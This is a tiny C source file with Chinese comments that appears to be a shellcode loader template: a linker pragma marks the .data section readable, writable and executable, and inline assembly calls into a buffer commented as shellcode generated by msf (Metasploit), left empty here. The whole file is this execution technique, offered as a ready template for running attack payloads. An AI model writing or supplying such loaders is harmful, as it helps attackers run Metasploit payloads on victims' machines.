#pragma comment(linker, "/section:.data,RWE") // 将data段的内存设置成可读可写可执行
#include <Windows.h>

// 从msf生成的Shellcode
unsigned char buf[] = "";


void main() {
	__asm {
		lea eax, buf    // 将buf的地址加载到eax寄存器
		call eax  // 使用call指令跳转到eax寄存器指向的地址（即buf），开始执行shellcode
	}
}
